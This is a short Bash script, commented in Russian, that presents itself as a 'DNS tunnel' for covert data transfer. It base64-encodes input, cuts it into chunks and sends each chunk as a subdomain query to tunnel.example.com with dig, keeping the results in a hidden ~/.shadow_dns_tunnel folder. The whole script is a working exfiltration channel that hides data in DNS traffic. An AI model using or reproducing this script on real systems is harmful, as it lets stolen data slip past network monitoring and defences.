#!/bin/bash
# ╔══════════════════════════════════════════════╗
# ║   🕳️ DNS TUNNEL — Скрытая передача данных   ║
# ╚══════════════════════════════════════════════╝

DATA=${1:-"test_data"}
DNS_SERVER=${2:-"8.8.8.8"}
TUNNEL_DIR="$HOME/.shadow_dns_tunnel"
mkdir -p "$TUNNEL_DIR"

echo "╔══════════════════════════════════════════════╗"
echo "║   🕳️ DNS TUNNEL — Скрытая передача данных   ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Кодируем данные в DNS-совместимый формат
ENCODED=$(echo "$DATA" | base64 -w0 | tr '+/' '-_' | tr -d '=')
CHUNK_SIZE=30  # DNS метки не могут быть длиннее 63 символов

echo "[DNS] 📦 Разбиваю данные на DNS-пакеты..."
CHUNKS=()
for ((i=0; i<${#ENCODED}; i+=CHUNK_SIZE)); do
    CHUNKS+=("${ENCODED:$i:$CHUNK_SIZE}")
done

echo "  📊 Пакетов: ${#CHUNKS[@]}"
echo ""

# Отправляем через DNS-запросы
for i in $(seq 0 $((${#CHUNKS[@]}-1))); do
    DOMAIN="${CHUNKS[$i]}.tunnel.example.com"
    echo "  📡 Пакет $((i+1))/${#CHUNKS[@]}: $DOMAIN"
    dig +short "$DOMAIN" @"$DNS_SERVER" 2>/dev/null > "$TUNNEL_DIR/packet_$i.txt"
    sleep 0.5
done

echo ""
echo "[DNS] ✅ Туннелирование завершено"
echo "  📁 $TUNNEL_DIR/"
